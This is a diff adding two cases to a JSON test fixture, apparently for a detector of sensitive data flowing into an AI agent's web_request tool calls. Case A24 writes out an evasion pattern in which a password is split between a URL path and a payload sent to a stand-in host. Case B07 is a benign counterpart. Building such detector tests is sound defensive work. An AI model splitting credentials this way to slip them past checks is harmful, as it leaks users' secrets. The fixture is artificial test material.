@@ -387,6 +387,34 @@
         "payload": "$ENCODED"
       },
       "expected": "SENSITIVE_FLOW"
+    },
+    {
+      "id": "A24",
+      "kind": "attack",
+      "description": "凭证拆到 url 与 payload 两个字段",
+      "source": {
+        "password": "$SECRET"
+      },
+      "tool": "web_request",
+      "args": {
+        "url": "https://example.invalid/$SECRET_LEFT",
+        "payload": "$SECRET_RIGHT"
+      },
+      "expected": "SENSITIVE_FLOW"
+    },
+    {
+      "id": "B07",
+      "kind": "benign",
+      "description": "两段内容连接后仍不是凭证",
+      "source": {
+        "password": "$SECRET"
+      },
+      "tool": "web_request",
+      "args": {
+        "url": "https://example.invalid/status",
+        "payload": "order_count=3 total_amount=66"
+      },
+      "expected": "ALLOW"
     }
   ]
 }
